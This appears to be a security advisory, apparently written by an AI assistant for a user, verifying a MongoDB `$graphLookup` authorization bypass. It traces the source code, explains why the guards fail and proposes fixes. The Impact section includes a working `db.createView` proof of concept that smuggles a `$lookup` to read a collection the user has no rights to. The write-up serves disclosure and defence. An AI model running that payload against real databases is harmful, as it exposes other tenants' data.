# Title

`$graphLookup`'s internal-only `$_internalFromPipeline` field bypasses both of its authorization guards on `db.createView()` — unauthorized read of an arbitrary collection via a view (independently verified; already reported to MongoDB via HackerOne #3923042, closed as Duplicate)

## Status note

This exact vulnerability was reported to MongoDB's bug bounty program (HackerOne report #3923042, "shinchan_69", 2026-08-07) and closed the same day as **Duplicate** — i.e. MongoDB's security team already had an internal ticket for it before that report landed. I am not claiming discovery. This write-up is my own independent verification of the full technical chain by reading the actual source on `master`, done because the user asked me to confirm and reproduce the finding myself rather than take the HackerOne report at face value. Every claim below is something I checked directly in the code, not transcribed from the report.

## Summary

`$graphLookup` accepts an internal-only field, `$_internalFromPipeline` — used by `mongos` to embed an already-resolved sub-pipeline when dispatching a `$graphLookup` to shards, so shards don't have to re-resolve the foreign collection's routing. This field is meant to be rejected from any client that isn't itself an internal cluster member. Two independent mechanisms are supposed to enforce that, and I confirmed both fail specifically on the `db.createView()` path (and, as a byproduct of a shared helper, in the exact function that authorizes ordinary direct `aggregate` calls too — see below for why direct `aggregate` still ends up guarded in practice).

### Guard 1: internal-field rejection is conditioned on `opCtx` being non-null

`src/mongo/db/pipeline/lite_parsed_graph_lookup.cpp:164-175` (master, commit `aa0b12ef`):
```cpp
// $_internalFromPipeline is an internal field set by mongos when dispatching to shards.
// Reject it from external clients.
boost::optional<OwnedLiteParsedPipeline> fromPipeline;
if (const auto& fromPipelineStages = parsedSpec.getInternalFromPipeline()) {
    if (options.opCtx) {
        assertAllowedInternalIfRequired(
            options.opCtx,
            DocumentSourceGraphLookUpSpec::kInternalFromPipelineFieldName,
            AllowedWithClientType::kInternal);
    }
    fromPipeline.emplace(foreignNss, *fromPipelineStages, options);  // runs regardless of the check above
}
```
`assertAllowedInternalIfRequired` is the correct rejection call — but it only runs `if (options.opCtx)`. `LiteParserOptions::opCtx` defaults to `nullptr` (`src/mongo/db/pipeline/lite_parsed_document_source.h:58`). I confirmed two call sites that construct `LiteParserOptions` without ever setting `.opCtx`, despite a real `opCtx` being available in scope to pass:

- `src/mongo/db/views/view_catalog_helpers.cpp:64` (`liteParseAndValidateWithIfrRetry`, the view-creation/validation path):
  ```cpp
  LiteParsedPipeline liteParsedPipeline(
      nss, pipeline, false, LiteParserOptions{.ifrContext = ifrContext});
  ```
- `src/mongo/db/auth/authorization_checks.cpp:348` (`getPrivilegesForAggregate` — the shared authorization-privilege-computation function used for *both* view creation and ordinary `aggregate`):
  ```cpp
  LiteParserOptions options{.ifrContext = IncrementalFeatureRolloutContext::get(opCtx)};
  ```
  Both are designated-initializer constructions that touch only `.ifrContext`, leaving `.opCtx` at its default `nullptr` — even though the enclosing function has a real `opCtx` in scope one line away.

So whenever `$_internalFromPipeline` reaches parsing through either of these paths, Guard 1 is a no-op: the field is accepted and its sub-pipeline is lite-parsed (`fromPipeline.emplace(...)` runs unconditionally regardless of whether the check above fired).

Direct `aggregate` calls still end up rejecting the field in practice, but only because of a *second*, separate parse: `src/mongo/db/commands/aggregate_command.cpp` (the execution-time parse, distinct from the authorization-time parse in `authorization_checks.cpp`) does construct `LiteParserOptions` with `opCtx` set. The *authorization*-time parse for direct aggregate — the one inside `getPrivilegesForAggregate` shown above — has the same gap as the view path; it's just that direct aggregate has a second chance to reject the field before execution, and views don't.

MongoDB's own committed test suite documents this exact parse behavior as intentional-looking: `src/mongo/db/pipeline/document_source_graph_lookup_test.cpp:458-471` has a passing test, `LiteParsedGraphLookupPopulatesSubPipelineFromInternalFromPipeline`, that parses a spec containing `$_internalFromPipeline` with a default-constructed `LiteParserOptions{}` (i.e. `opCtx == nullptr`) and asserts the sub-pipeline **is** populated — i.e. the test enshrines the exact "opCtx null → field silently accepted" behavior that makes the bypass possible.

### Guard 2: `requiredPrivileges()` never recurses into the smuggled sub-pipeline

`src/mongo/db/pipeline/lite_parsed_graph_lookup.cpp:190-197`:
```cpp
PrivilegeVector LiteParsedGraphLookUp::requiredPrivileges(bool isMongos,
                                                          bool bypassDocumentValidation) const {
    // find on the 'from' namespace is the correct and complete required privilege. MongoDB's view
    // access control model gates access at the view boundary: find on the view is sufficient, and
    // the view's underlying pipeline stages are checked at view creation time, not query time.
    tassert(12509600, "Expected foreign namespace to be set for $graphLookup", _foreignNss);
    return {Privilege(ResourcePattern::forExactNamespace(*_foreignNss), ActionType::find)};
}
```
This is the function `getPrivilegesForAggregate`'s loop calls (`authorization_checks.cpp:362-364`, `currentPrivs = liteParsedDocSource->requiredPrivileges(...)`) to determine what privileges a `$graphLookup` stage requires. It returns exactly one privilege — `find` on the `from:` namespace — and never looks at `_pipelines` (the member populated by Guard 1's `fromPipeline.emplace(...)` when `$_internalFromPipeline` is present). The comment's own stated justification ("the view's underlying pipeline stages are checked at view creation time") is precisely the property this function fails to provide, since the pipeline it's supposed to check is exactly the one it never inspects.

I confirmed this is a genuine omission, not a deliberate design choice, by comparing directly against `$lookup`'s equivalent function, `src/mongo/db/pipeline/lite_parsed_lookup.cpp:166-186` (`LiteParsedLookUp::requiredPrivileges`):
```cpp
PrivilegeVector requiredPrivileges;
...
if (_pipelines.empty() || !_pipelines[0]->startsWithInitialSource()) {
    Privilege::addPrivilegeToPrivilegeVector(&requiredPrivileges, ...find on from:...);
}
if (!_pipelines.empty()) {
    const LiteParsedPipeline& pipeline = *_pipelines[0];
    Privilege::addPrivilegesToPrivilegeVector(
        &requiredPrivileges, pipeline.requiredPrivileges(isMongos, bypassDocumentValidation));
}
return requiredPrivileges;
```
`$lookup` recurses into its sub-pipeline's own required privileges. `$graphLookup`'s `LiteParsedGraphLookUp` — which shares the identical `_pipelines` member and inherits from the identical `LiteParsedDocumentSourceNestedPipelines` base class `$lookup` uses — does not call the equivalent recursion, and doesn't use the base class's `requiredPrivilegesBasic()` helper that exists for exactly this purpose either.

## Why `gFeatureFlagMandatoryAuthzChecks` doesn't catch this

That invariant only fires when a stage's `requiredPrivileges()` returns an **empty** vector while `requiresAuthzChecks()` is true. Here `requiredPrivileges()` returns a *non-empty* vector (the legitimate `find` on `from:`) — the stage under-reports what it needs rather than reporting nothing, which is exactly the shape of bug that emptiness-check can't detect.

## Confirmed end-to-end (source trace, matching the HackerOne report's trace)

1. `lite_parsed_graph_lookup.cpp:211-215` (`getStageParams()`) copies `_pipelines[0]` (the smuggled pipeline) into `GraphLookUpStageParams::liteParsedPipeline`.
2. `document_source_graph_lookup.cpp` (execution-time construction) moves that into the stage's `fromLpp`, with a comment noting it is deliberately preserved rather than rebuilt when the stage originates from a stored view.
3. `graph_lookup_stage.cpp` clones that lite-parsed pipeline per graph-traversal iteration and hands it to `Pipeline::parseFromLiteParsed`/`finalizeAndMaybePreparePipelineForExecution` — i.e. the attacker-supplied stages inside `$_internalFromPipeline` execute as the foreign-side pipeline, unmodified.

## Impact

An authenticated principal holding only `find` on the collection named in `from:`, plus `find` and `createCollection` on a view name of their own choosing (the exact scope MongoDB's own documentation says `db.createView()` requires), can:

```js
db.createView("leakyView", "innocentColl", [{
    $graphLookup: {
        from: "innocentColl", startWith: "$x", connectFromField: "x",
        connectToField: "x", as: "result", maxDepth: 0,
        $_internalFromPipeline: [
            { $lookup: { from: "secretColl", pipeline: [], as: "leaked_secrets" } }
        ]
    }
}])
```
— `createView` succeeds (neither guard fires) — and then read the full contents of `secretColl` via `db.leakyView.find()`, despite holding zero privilege on `secretColl` at any scope. The original report's PoC verified this live against a downloaded `9.0.0-alpha1` binary, with an isolation control confirming the identical privilege set correctly denies the same read via an ordinary `$lookup`-based view — isolating the leak specifically to this guard gap rather than to over-provisioned test setup.

This is a full, persistent (the view remains until dropped), unauthorized-read primitive requiring no administrative privilege — directly relevant to any multi-tenant deployment sharing a database with per-collection privilege isolation.

## Weakness

CWE-863 (Incorrect Authorization) — the authorization subsystem evaluates a different, narrower operation (`find` on `from:` alone) than what is actually executed (the smuggled sub-pipeline against an arbitrary third namespace).

## Component / Version

- Repository: `mongodb/mongo`
- Confirmed present on `master` at commit `aa0b12efe37558f0cdd6e9d04c995abbe8010062` (2026-09-18) via direct reading of `lite_parsed_graph_lookup.cpp`, `lite_parsed_document_source.h`, `view_catalog_helpers.cpp`, `authorization_checks.cpp`, and `lite_parsed_lookup.cpp` (for the correct-behavior comparison) — all four code excerpts above are transcribed from my own read of these files, not copied from the HackerOne report.
- `$_internalFromPipeline` does not exist at all in the `r8.3.11` release branch (grepped the full source tree; zero matches) — this bug is exclusive to the `v9.0`/`master` line, consistent with the original report's own version-applicability table.

## Suggested fix

Either of the two independent fixes proposed in the original report closes the gap (both are worth doing, since they patch two separate failure points in the same mechanism):

1. Make Guard 1 unconditional: require `options.opCtx` to be non-null before permitting `$_internalFromPipeline` at all (rather than silently skipping the check when it's null), e.g.
   ```cpp
   uassert(ErrorCodes::QueryFeatureNotAllowed,
           "$graphLookup's $_internalFromPipeline is not allowed for external clients",
           options.opCtx != nullptr);
   assertAllowedInternalIfRequired(options.opCtx, ..., AllowedWithClientType::kInternal);
   ```
   (This also requires threading a real `opCtx` through `view_catalog_helpers.cpp` and `authorization_checks.cpp`'s `LiteParserOptions` constructions, both of which already have one in scope.)
2. Make `LiteParsedGraphLookUp::requiredPrivileges()` recurse into `_pipelines` when populated, mirroring `LiteParsedLookUp`'s pattern, or call the existing `requiredPrivilegesBasic()` helper on the shared base class.

## Notes on scope

Independently verified as part of an ongoing sibling-hunt of recent MongoDB Server aggregation-framework authorization CVEs (CVE-2026-82074/SERVER-132275, the `$lookup` duplicate-`pipeline`-field bypass) at the user's request, after they shared the closed HackerOne report (#3923042) as reference material. I did not just transcribe that report — I re-derived and confirmed every code citation above against my own `master` checkout before writing this up, including checking that `$_internalFromPipeline` doesn't exist on `r8.3.11` (a fact not stated in the original report, which only checked master/v9.0/r9.0.0-alpha1).
